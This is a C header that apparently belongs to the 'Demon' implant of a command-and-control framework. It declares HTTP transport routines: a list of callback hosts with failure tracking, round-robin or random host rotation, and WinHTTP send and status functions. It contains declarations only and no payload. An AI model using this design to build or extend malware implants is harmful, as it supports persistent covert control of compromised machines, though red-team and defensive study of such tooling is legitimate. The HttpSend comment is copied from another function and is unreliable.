#ifndef DEMON_TRANSPORTHTTP_H
#define DEMON_TRANSPORTHTTP_H

#include <Core/Win32.h>

#include <windows.h>
#include <winhttp.h>

#ifdef TRANSPORT_HTTP

#define TRANSPORT_HTTP_ROTATION_ROUND_ROBIN  0
#define TRANSPORT_HTTP_ROTATION_RANDOM       1

typedef struct _HOST_DATA
{
    /* Host Data */
    LPWSTR Host;
    DWORD  Port;
    DWORD  Failures;
    BOOL   Dead;

    /* Next Host Data */
    struct _HOST_DATA* Next;
} HOST_DATA, *PHOST_DATA;

/*!
 * Adds a host to the linked list
 * @param Host
 * @param Port
 * @return Host pointer
 */
PHOST_DATA HostAdd( LPWSTR Host, SIZE_T Size, DWORD Port );

/*!
 * Counts how many hosts are in the linked list
 * @return Hosts counter
 */
DWORD HostCount( VOID );

/*!
 * Increments the failure counter and checks if we hit the max.
 * if we hit the max then we are going to use the next one.
 * @param Host
 * @return If hit the max then return the next Host.
 *         If not then return the passed Host.
 */
PHOST_DATA HostFailure( PHOST_DATA Host );

/*!
 * Chooses a host from the linked list based on the Host rotation option.
 * @return Host data
 */
PHOST_DATA HostRotation( SHORT Strategy );

/*!
 * Gets a random host from the linked list. (doesn't check if its dead)
 * @return Random Host from linked list
 */
PHOST_DATA HostRandom();

/*!
 * Checks if every host is dead.
 * if every host is dead then return FALSE.
 * if one or more hosts are not dead then TRUE
 * @return if more than one host is not marked as dead then return TRUE else return FALSE
 */
BOOL HostCheckup();

/*!
 * Query the Http Status code from the request response.
 * @param hRequest
 * @return Http status code
 */
DWORD HttpQueryStatus( HANDLE hRequest );

/*!
 * Query the Http Status code from the request response.
 * @param hRequest
 * @return Http status code
 */
BOOL HttpSend( PBUFFER Send, PBUFFER Response );

#endif

#endif